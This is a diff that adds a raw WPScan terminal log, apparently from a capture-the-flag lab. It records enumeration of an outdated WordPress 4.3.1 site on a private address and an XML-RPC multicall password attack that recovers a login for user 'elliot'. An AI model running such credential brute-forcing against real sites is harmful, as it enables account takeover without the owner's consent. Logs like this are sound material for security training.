@@ -1,0 +1,100 @@
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.20
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[34m[i][0m It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N][?2004hn
+[?2004l[32m[+][0m URL: http://10.10.67.237/ [10.10.67.237]
+[32m[+][0m Started: Fri Jan 21 12:49:19 2022
+
+Interesting Finding(s):
+
+[32m[+][0m Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[32m[+][0m robots.txt found: http://10.10.67.237/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[32m[+][0m XML-RPC seems to be enabled: http://10.10.67.237/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[32m[+][0m The external WP-Cron seems to be enabled: http://10.10.67.237/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[32m[+][0m WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.67.237/16c9d59.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.67.237/16c9d59.html, Match: 'WordPress 4.3.1'
+
+[32m[+][0m WordPress theme in use: twentyfifteen
+ | Location: http://10.10.67.237/wp-content/themes/twentyfifteen/
+ | Last Updated: 2021-07-22T00:00:00.000Z
+ | Readme: http://10.10.67.237/wp-content/themes/twentyfifteen/readme.txt
+ | [33m[!][0m The version is out of date, the latest version is 3.0
+ | Style URL: http://10.10.67.237/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen/
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.67.237/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'
+
+[32m[+][0m Enumerating All Plugins (via Passive Methods)
+
+[34m[i][0m No plugins Found.
+
+[32m[+][0m Enumerating Config Backups (via Passive and Aggressive Methods)
+                                                                                 Checking Config Backups - Time: 00:00:00 <    > (0 / 137)  0.00%  ETA: ??:??:?? Checking Config Backups - Time: 00:00:00 <    > (1 / 137)  0.72%  ETA: 00:01:27 Checking Config Backups - Time: 00:00:00 <    > (2 / 137)  1.45%  ETA: 00:01:01 Checking Config Backups - Time: 00:00:07 <    > (3 / 137)  2.18%  ETA: 00:05:39 Checking Config Backups - Time: 00:00:07 <    > (9 / 137)  6.56%  ETA: 00:01:45 Checking Config Backups - Time: 00:00:07 <   > (14 / 137) 10.21%  ETA: 00:01:05 Checking Config Backups - Time: 00:00:07 <   > (19 / 137) 13.86%  ETA: 00:00:46 Checking Config Backups - Time: 00:00:07 <   > (24 / 137) 17.51%  ETA: 00:00:35 Checking Config Backups - Time: 00:00:07 <   > (30 / 137) 21.89%  ETA: 00:00:26 Checking Config Backups - Time: 00:00:07 <   > (36 / 137) 26.27%  ETA: 00:00:21 Checking Config Backups - Time: 00:00:07 <   > (37 / 137) 27.00%  ETA: 00:00:21 Checking Config Backups - Time: 00:00:07 <   > (43 / 137) 31.38%  ETA: 00:00:17 Checking Config Backups - Time: 00:00:07 <=  > (49 / 137) 35.76%  ETA: 00:00:14 Checking Config Backups - Time: 00:00:07 <=  > (52 / 137) 37.95%  ETA: 00:00:13 Checking Config Backups - Time: 00:00:08 <=  > (53 / 137) 38.68%  ETA: 00:00:13 Checking Config Backups - Time: 00:00:08 <=  > (54 / 137) 39.41%  ETA: 00:00:13 Checking Config Backups - Time: 00:00:08 <=  > (55 / 137) 40.14%  ETA: 00:00:13 Checking Config Backups - Time: 00:00:08 <=  > (56 / 137) 40.87%  ETA: 00:00:13 Checking Config Backups - Time: 00:00:08 <=  > (57 / 137) 41.60%  ETA: 00:00:12 Checking Config Backups - Time: 00:00:08 <=  > (58 / 137) 42.33%  ETA: 00:00:12 Checking Config Backups - Time: 00:00:09 <=  > (59 / 137) 43.06%  ETA: 00:00:12 Checking Config Backups - Time: 00:00:09 <=  > (61 / 137) 44.52%  ETA: 00:00:12 Checking Config Backups - Time: 00:00:09 <=  > (62 / 137) 45.25%  ETA: 00:00:11 Checking Config Backups - Time: 00:00:09 <=  > (63 / 137) 45.98%  ETA: 00:00:11 Checking Config Backups - Time: 00:00:09 <=  > (64 / 137) 46.71%  ETA: 00:00:11 Checking Config Backups - Time: 00:00:09 <=  > (65 / 137) 47.44%  ETA: 00:00:11 Checking Config Backups - Time: 00:00:10 <=  > (66 / 137) 48.17%  ETA: 00:00:11 Checking Config Backups - Time: 00:00:10 <=  > (67 / 137) 48.90%  ETA: 00:00:11 Checking Config Backups - Time: 00:00:10 <=  > (68 / 137) 49.63%  ETA: 00:00:10 Checking Config Backups - Time: 00:00:10 <=  > (69 / 137) 50.36%  ETA: 00:00:10 Checking Config Backups - Time: 00:00:10 <=  > (70 / 137) 51.09%  ETA: 00:00:10 Checking Config Backups - Time: 00:00:10 <=  > (71 / 137) 51.82%  ETA: 00:00:10 Checking Config Backups - Time: 00:00:10 <=  > (72 / 137) 52.55%  ETA: 00:00:10 Checking Config Backups - Time: 00:00:10 <=  > (73 / 137) 53.28%  ETA: 00:00:10 Checking Config Backups - Time: 00:00:11 <=  > (74 / 137) 54.01%  ETA: 00:00:10 Checking Config Backups - Time: 00:00:11 <=  > (75 / 137) 54.74%  ETA: 00:00:09 Checking Config Backups - Time: 00:00:11 <=  > (76 / 137) 55.47%  ETA: 00:00:09 Checking Config Backups - Time: 00:00:11 <=  > (77 / 137) 56.20%  ETA: 00:00:09 Checking Config Backups - Time: 00:00:11 <=  > (78 / 137) 56.93%  ETA: 00:00:09 Checking Config Backups - Time: 00:00:11 <=  > (80 / 137) 58.39%  ETA: 00:00:09 Checking Config Backups - Time: 00:00:12 <=  > (81 / 137) 59.12%  ETA: 00:00:08 Checking Config Backups - Time: 00:00:12 <=  > (82 / 137) 59.85%  ETA: 00:00:08 Checking Config Backups - Time: 00:00:12 <=  > (84 / 137) 61.31%  ETA: 00:00:08 Checking Config Backups - Time: 00:00:12 <=  > (85 / 137) 62.04%  ETA: 00:00:08 Checking Config Backups - Time: 00:00:12 <=  > (86 / 137) 62.77%  ETA: 00:00:08 Checking Config Backups - Time: 00:00:12 <=  > (88 / 137) 64.23%  ETA: 00:00:07 Checking Config Backups - Time: 00:00:13 <=  > (89 / 137) 64.96%  ETA: 00:00:07 Checking Config Backups - Time: 00:00:13 <=  > (90 / 137) 65.69%  ETA: 00:00:07 Checking Config Backups - Time: 00:00:13 <== > (92 / 137) 67.15%  ETA: 00:00:07 Checking Config Backups - Time: 00:00:13 <== > (93 / 137) 67.88%  ETA: 00:00:07 Checking Config Backups - Time: 00:00:13 <== > (94 / 137) 68.61%  ETA: 00:00:06 Checking Config Backups - Time: 00:00:13 <== > (95 / 137) 69.34%  ETA: 00:00:06 Checking Config Backups - Time: 00:00:14 <== > (96 / 137) 70.07%  ETA: 00:00:06 Checking Config Backups - Time: 00:00:14 <== > (97 / 137) 70.80%  ETA: 00:00:06 Checking Config Backups - Time: 00:00:14 <== > (98 / 137) 71.53%  ETA: 00:00:06 Checking Config Backups - Time: 00:00:14 <== > (99 / 137) 72.26%  ETA: 00:00:06 Checking Config Backups - Time: 00:00:14 <= > (100 / 137) 72.99%  ETA: 00:00:05 Checking Config Backups - Time: 00:00:14 <= > (101 / 137) 73.72%  ETA: 00:00:05 Checking Config Backups - Time: 00:00:14 <= > (102 / 137) 74.45%  ETA: 00:00:05 Checking Config Backups - Time: 00:00:14 <= > (103 / 137) 75.18%  ETA: 00:00:05 Checking Config Backups - Time: 00:00:15 <= > (104 / 137) 75.91%  ETA: 00:00:05 Checking Config Backups - Time: 00:00:15 <= > (105 / 137) 76.64%  ETA: 00:00:05 Checking Config Backups - Time: 00:00:15 <= > (106 / 137) 77.37%  ETA: 00:00:05 Checking Config Backups - Time: 00:00:15 <= > (107 / 137) 78.10%  ETA: 00:00:04 Checking Config Backups - Time: 00:00:15 <= > (108 / 137) 78.83%  ETA: 00:00:04 Checking Config Backups - Time: 00:00:15 <= > (109 / 137) 79.56%  ETA: 00:00:04 Checking Config Backups - Time: 00:00:15 <= > (110 / 137) 80.29%  ETA: 00:00:04 Checking Config Backups - Time: 00:00:15 <= > (111 / 137) 81.02%  ETA: 00:00:04 Checking Config Backups - Time: 00:00:16 <= > (112 / 137) 81.75%  ETA: 00:00:04 Checking Config Backups - Time: 00:00:16 <= > (113 / 137) 82.48%  ETA: 00:00:03 Checking Config Backups - Time: 00:00:16 <= > (114 / 137) 83.21%  ETA: 00:00:03 Checking Config Backups - Time: 00:00:16 <= > (115 / 137) 83.94%  ETA: 00:00:03 Checking Config Backups - Time: 00:00:16 <= > (116 / 137) 84.67%  ETA: 00:00:03 Checking Config Backups - Time: 00:00:16 <= > (118 / 137) 86.13%  ETA: 00:00:03 Checking Config Backups - Time: 00:00:17 <= > (119 / 137) 86.86%  ETA: 00:00:03 Checking Config Backups - Time: 00:00:17 <= > (120 / 137) 87.59%  ETA: 00:00:02 Checking Config Backups - Time: 00:00:17 <= > (122 / 137) 89.05%  ETA: 00:00:02 Checking Config Backups - Time: 00:00:17 <= > (123 / 137) 89.78%  ETA: 00:00:02 Checking Config Backups - Time: 00:00:17 <= > (124 / 137) 90.51%  ETA: 00:00:02 Checking Config Backups - Time: 00:00:17 <= > (125 / 137) 91.24%  ETA: 00:00:02 Checking Config Backups - Time: 00:00:17 <= > (126 / 137) 91.97%  ETA: 00:00:02 Checking Config Backups - Time: 00:00:18 <= > (128 / 137) 93.43%  ETA: 00:00:01 Checking Config Backups - Time: 00:00:18 <= > (129 / 137) 94.16%  ETA: 00:00:01 Checking Config Backups - Time: 00:00:18 <= > (130 / 137) 94.89%  ETA: 00:00:01 Checking Config Backups - Time: 00:00:18 <= > (131 / 137) 95.62%  ETA: 00:00:01 Checking Config Backups - Time: 00:00:18 <= > (132 / 137) 96.35%  ETA: 00:00:01 Checking Config Backups - Time: 00:00:18 <= > (133 / 137) 97.08%  ETA: 00:00:01 Checking Config Backups - Time: 00:00:18 <= > (134 / 137) 97.81%  ETA: 00:00:00 Checking Config Backups - Time: 00:00:19 <= > (136 / 137) 99.27%  ETA: 00:00:00 Checking Config Backups - Time: 00:00:19 <=> (137 / 137) 100.00% Time: 00:00:19
+
+[34m[i][0m No Config Backups Found.
+
+[32m[+][0m Performing password attack on Xmlrpc Multicall against 1 user/s
+                                                                                Progress Time: 00:00:00 <                       > (0 / 22)  0.00%  ETA: ??:??:??Progress Time: 00:00:17 <                       > (1 / 22)  4.54%  ETA: 00:06:55Progress Time: 00:00:35 <==                     > (2 / 22)  9.09%  ETA: 00:06:16Progress Time: 00:00:53 <==                     > (3 / 22) 13.63%  ETA: 00:05:51Progress Time: 00:01:11 <====                   > (4 / 22) 18.18%  ETA: 00:05:35Progress Time: 00:01:24 <=====                  > (5 / 22) 22.72%  ETA: 00:04:57Progress Time: 00:01:27 <======                 > (6 / 22) 27.27%  ETA: 00:03:58Progress Time: 00:01:28 <=======                > (7 / 22) 31.81%  ETA: 00:03:15Progress Time: 00:01:31 <========               > (8 / 22) 36.36%  ETA: 00:02:43Progress Time: 00:01:33 <=========              > (9 / 22) 40.90%  ETA: 00:02:18Progress Time: 00:01:35 <=========             > (10 / 22) 45.45%  ETA: 00:01:57Progress Time: 00:01:37 <===========           > (11 / 22) 50.00%  ETA: 00:01:39Progress Time: 00:01:39 <===========           > (12 / 22) 54.54%  ETA: 00:01:24                                                                                [SUCCESS] - elliot / ER28-0652
+Progress Time: 00:01:39 <===========           > (12 / 22) 54.54%  ETA: 00:01:24                                                                                All Found
+Progress Time: 00:01:39 <===========           > (12 / 22) 54.54%  ETA: 00:01:24Progress Time: 00:01:39 <===========           > (12 / 22) 54.54%  ETA: ??:??:??
+
+[31m[!][0m Valid Combinations Found:
+ | Username: elliot, Password: ER28-0652
+
+[33m[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
+[33m[!][0m You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[32m[+][0m Finished: Fri Jan 21 12:51:24 2022
+[32m[+][0m Requests Done: 187
+[32m[+][0m Cached Requests: 6
+[32m[+][0m Data Sent: 47.264 KB
+[32m[+][0m Data Received: 1.496 MB
+[32m[+][0m Memory used: 359.133 MB
+[32m[+][0m Elapsed time: 00:02:05
